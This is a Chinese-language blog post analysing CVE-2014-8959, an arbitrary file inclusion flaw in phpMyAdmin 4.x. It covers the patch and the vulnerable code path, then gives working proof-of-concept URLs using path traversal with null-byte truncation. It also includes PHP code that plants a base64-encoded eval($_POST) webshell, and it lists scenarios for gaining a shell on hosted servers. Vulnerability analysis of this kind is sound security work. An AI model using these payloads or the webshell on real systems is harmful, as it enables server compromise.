# [CVE-2014-8959] phpmyadmin 任意文件包含漏洞分析 - Oran9e - 博客园

> 原文：[`www.cnblogs.com/Oran9e/p/8059954.html`](https://www.cnblogs.com/Oran9e/p/8059954.html)

**0x01 漏洞描述**

phpmyadmin 是一款应用非常广泛的 mysql 数据库管理软件，基于 PHP 开发。

最新的 CVE-2014-8959 公告中，提到该程序多个版本存在任意文件包含漏洞，影响版本如下：

phpMyAdmin 

4.0.1 - 4.0.10.6

4.1.1 - 4.1.14.7 

4.2.1 - 4.2.12

**0x02 补丁分析**

看到 bobao.360.cn 上提到了这个漏洞，于是我写个小分析吧，给渗透正没思路的人一个思路，也给学习代码审计的朋友一点资料。

前几天 phpmyadmin 出了个新的补丁。

地址在此：[`www.phpmyadmin.net/home_page/security/PMASA-2014-14.php`](http://www.phpmyadmin.net/home_page/security/PMASA-2014-14.php)

修复了一个 phpmyadmin4.x 版本中的任意文件包含漏洞，我们看一下 4.0 版本的补丁：

[`github.com/phpmyadmin/phpmyadmin/commit/2e3f0b9457b3c8f78beb864120bd9d55617a11b5`](https://github.com/phpmyadmin/phpmyadmin/commit/2e3f0b9457b3c8f78beb864120bd9d55617a11b5)

![t01e99dbee39248ac7f.png](http://p0.qhimg.com/t01e99dbee39248ac7f.png)

在文件 libraries/gis/pma_gis_factory.php 中对$type_lower 多加了个判断。由此我们可以猜测，文件包含的点就出在$type_lower 这里。

**0x03 漏洞代码分析**

我们来到 libraries/gis/pma_gis_factory.php 29 行：

```
 public static function factory($type)
    {
        include_once './libraries/gis/pma_gis_geometry.php';
        $type_lower = strtolower($type); if (! file_exists('./libraries/gis/pma_gis_' . $type_lower . '.php')) { return false;
        } if (include_once './libraries/gis/pma_gis_' . $type_lower . '.php') {
            switch(strtoupper($type)) {
            case 'MULTIPOLYGON' : return PMA_GIS_Multipolygon::singleton();
            case 'POLYGON' : return PMA_GIS_Polygon::singleton();
            case 'MULTIPOINT' : return PMA_GIS_Multipoint::singleton();
            case 'POINT' : return PMA_GIS_Point::singleton();
            case 'MULTILINESTRING' : return PMA_GIS_Multilinestring::singleton();
            case 'LINESTRING' : return PMA_GIS_Linestring::singleton();
            case 'GEOMETRYCOLLECTION' : return PMA_GIS_Geometrycollection::singleton();
            default : return false;
            }
        } else { return false;
        }
}
```

将传入的参数$type 转换小写以后赋值给$type_lower，直接拼接成路径进行 include_once。

我们来搜一下 factory 这个函数：

![t010fa3d1951f1d9a2e.png](http://p2.qhimg.com/t010fa3d1951f1d9a2e.png)

很多地方在调用，但最直接的还是/gis_data_editor.php，进来看看：

```
// Get data if any posted
$gis_data = array(); if (PMA_isValid($_REQUEST['gis_data'], 'array')) {
    $gis_data = $_REQUEST['gis_data'];
}
$gis_types = array( 'POINT', 'MULTIPOINT', 'LINESTRING', 'MULTILINESTRING', 'POLYGON', 'MULTIPOLYGON', 'GEOMETRYCOLLECTION' ); // Extract type from the initial call and make sure that it's a valid one.
// Extract from field's values if availbale, if not use the column type passed.
if (! isset($gis_data['gis_type'])) { if (isset($_REQUEST['type']) && $_REQUEST['type'] != '') {
        $gis_data['gis_type'] = strtoupper($_REQUEST['type']);
    } if (isset($_REQUEST['value']) && trim($_REQUEST['value']) != '') {
        $start = (substr($_REQUEST['value'], 0, 1) == "'") ? 1 : 0;
        $gis_data['gis_type'] = substr(
            $_REQUEST['value'], $start, strpos($_REQUEST['value'], "(") - $start
        );
    } if ((! isset($gis_data['gis_type'])) || (! in_array($gis_data['gis_type'], $gis_types))
    ) {
        $gis_data['gis_type'] = $gis_types[0];
    }
}
$geom_type = $gis_data['gis_type']; // Generate parameters from value passed.
$gis_obj = PMA_GIS_Factory::factory($geom_type);
```

首先$gis_data = $_REQUEST['gis_data'];获取到 gis_data，判断$gis_data['gis_type']是否已经存在，如果存在则跳过那一大串 if 子句。最后就将$gis_data['gis_type'];赋值给$geom_type，并传入 PMA_GIS_Factory::factory 函数。

实际这个利用方法很简单，简单到其实就是获取$_REQUEST['gis_data']['gis_type']并拼接到 include_once 中，造成任意文件包含。

**0x04 利用过程及 POC**

那我们来说说利用。这个漏洞为何没火，因为在我看来他需要两个条件：

1.登录到 phpmyadmin

2.需要截断

相对比较鸡肋。但实际上这两个条件也不难满足，很多时候我们通过任意文件可能能够获得某些数据库的访问权限，我们通过这个漏洞就能成功提权。

首先我的测试环境为 php 5.2.17 + phpmyadmin 4.0.3 （想想我为什么选这样的环境）

创建一个普通用户 test，没有任何权限，登录后只能看到 test 和 information_schema 表：

![t013bd35f556e2c03a9.png](http://p3.qhimg.com/t013bd35f556e2c03a9.png)

构造好 URL 直接访问（pma 的上层目录放着一个包含 phpinfo()的图片马 u1.gif）：

![t016110a6850deb0ee6.png](http://p5.qhimg.com/t016110a6850deb0ee6.png)

居然一片空白，没有出现我想要的 phpinfo！？

这又涉及到 phpmyadmin 的一个防御 CSRF 机制了，来到 libraries/common.inc.php 463 行：

```
$token_mismatch = true; if (PMA_isValid($_REQUEST['token'])) {
    $token_mismatch = ($_SESSION[' PMA_token '] != $_REQUEST['token']);
} if ($token_mismatch) { /**
     *  List of parameters which are allowed from unsafe source */ $allow_list = array( /* needed for direct access, see FAQ 1.34
         * also, server needed for cookie login screen (multi-server) */
        'server', 'db', 'table', 'target', 'lang', /* Session ID */
        'phpMyAdmin', /* Cookie preferences */
        'pma_lang', 'pma_collation_connection', /* Possible login form */
        'pma_servername', 'pma_username', 'pma_password', /* Needed to send the correct reply */
        'ajax_request', /* Permit to log out even if there is a token mismatch */
        'old_usr' ); /**
     * Allow changing themes in test/theme.php */
    if (defined('PMA_TEST_THEME')) {
        $allow_list[] = 'set_theme';
    } /**
     * Require cleanup functions */ include './libraries/cleanup.lib.php'; /**
     * Do actual cleanup */ PMA_remove_request_vars($allow_list);
}
```

他检查了$_SESSION[' PMA_token '] 是否等于 $_REQUEST['token']，如果不等于，最后会进入 PMA_remove_request_vars 函数，进去看看：

```
function PMA_remove_request_vars(&$whitelist)
{ // do not check only $_REQUEST because it could have been overwritten // and use type casting because the variables could have become // strings
    $keys = array_keys(
        array_merge((array)$_REQUEST, (array)$_GET, (array)$_POST, (array)$_COOKIE)
    );
    foreach ($keys as $key) { if (! in_array($key, $whitelist)) {
            unset($_REQUEST[$key], $_GET[$key], $_POST[$key], $GLOBALS[$key]);
        } else { // allowed stuff could be compromised so escape it // we require it to be a string if (isset($_REQUEST[$key]) && ! is_string($_REQUEST[$key])) {
                unset($_REQUEST[$key]);
            } if (isset($_POST[$key]) && ! is_string($_POST[$key])) {
                unset($_POST[$key]);
            } if (isset($_COOKIE[$key]) && ! is_string($_COOKIE[$key])) {
                unset($_COOKIE[$key]);
            } if (isset($_GET[$key]) && ! is_string($_GET[$key])) {
                unset($_GET[$key]);
            }
        }
    }
}
```

```
实际上将所有 GPCR 都清空了，那么后面的操作肯定不能正常运转了。  所以，我们必须带上 token 访问。那又有同学要问了，token 保存在 session 里，我又看不到 session。 其实用 phpmyadmin 多的同学就应该注意到，一般我们访问 pma 的时候都会在 url 里看到 token=xxx 这个参数，我们只需要在正常访问的时候将这个 token 拷贝下来就可以了：
```

![t0154a8d900bb6353b4.png](http://p2.qhimg.com/t0154a8d900bb6353b4.png)

带上 token 访问即可 getshell：

![t013868e9db81192a7e.png](http://p7.qhimg.com/t013868e9db81192a7e.png)

最终 POC：

[http://localhost/pma/gis_data_editor.php?token=0b21e4cff71e1df9f63c9c4952a8547f&gis_data[gis_type]=/../../../../u1.gif%00](http://localhost/pma/gis_data_editor.php?token=0b21e4cff71e1df9f63c9c4952a8547f&gis_data%5bgis_type%5d=/../../../../u1.gif%00)

Token=xxx，xxx 是你的 token，gis_data[gis_type]=yyy，yyy 是你要包含的文件。最终拼接到 include_once 后面的参数是“./libraries/gis/pma_gis_/../../../../u1.gif”。

**0x05 利用环境与鸡肋性**

想想利用环境吧？

1.虚拟主机：大多虚拟主机面板都会提供给用户一个普通数据库账号和 phpmyadmin，利用该账号登录，再通过包含进行 getshell，获得面板权限。

2.文件读取/备份下载：读取到某些配置文件，获得了一个数据库账号，通过 phpmyadmin 进行 getshell。

3.暴力破解：爆破出某些数据库用户，进入 phpmyadmin 拿 shell。

当然利用环境还可能有很多，另外我们还可能会遇到“包含哪个文件”的问题，这个就只能靠大家见仁见智咯~

附：测试所使用的 phpmyadmin 4.0.3：[`pan.baidu.com/s/1qWymmBE`](http://pan.baidu.com/s/1qWymmBE)

**0x05 修复建议**

更新官方最新版本：http://sourceforge.net/projects/phpmyadmin/

--------------------------------------------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------------------------------------------

0x01 漏洞原理

PHP 文件包含漏洞的产生原因是在通过 PHP 的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。
此漏洞中出现漏洞的代码在 libraries/gis/pma_gis_factory.php 29-59 行：将传入的参数$type 转换小写以后赋值给$type_lower，直接拼接成路径进行 include_once。
而在/gis_data_editor.php 中，$gis_data = $_REQUEST['gis_data'];获取到 gis_data，判断$gis_data[gis_type]是否已经存在，如果存在则跳过那一大串 if 子句。最后就将$gis_data[gis_type];赋值给$geom_type，并传入 PMA_GIS_Factory::factory 函数。
最后的利用方法是获取$_REQUEST[gis_data][gis_type]并拼接到 include_once 中，造成任意文件包含。

0x02 准备图片木马

```
<?php 
 file_put_contents("a.php",base64_decode("PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4="));
?> 
```

保存为 png 格式。
此段 php 代码的作用是在 phpMyAdmin 的根目录下创建一个 a.php 的一句话小马。
base64 解码后为:

```
<?php eval($_POST['a']);?>
```

0x03 Payload 构造进行文件包含

访问 phpMyAdmin 并登录 phpMyadmin。
登陆成功后跳转的 URL 含有唯一随机的 token，记下此 token。
构造漏洞链接

```
http://xxx.com/phpMyAdmin/gis_data_editor.php?token=xxxxx&gis_data[gis_type]=/../../../../imageurl 
```

替换 token 与 imageurl，并用截断。
payload 最终为:

```
http://xxx.com/phpMyAdmin/gis_data_editor.php?token=xxx&gis_data[gis_type]=/../../../../upload_images/xxx.png％00
```

(注意:token 的值和上传图片路径需要自行替换)

0x04 影响版本

```
4.0.1 - 4.0.10.6
4.1.1 - 4.1.14.7 
4.2.1 - 4.2.12
```

转载自安全客，原文链接（http://bobao.360.cn/learning/detail/113.html）

任重而道远！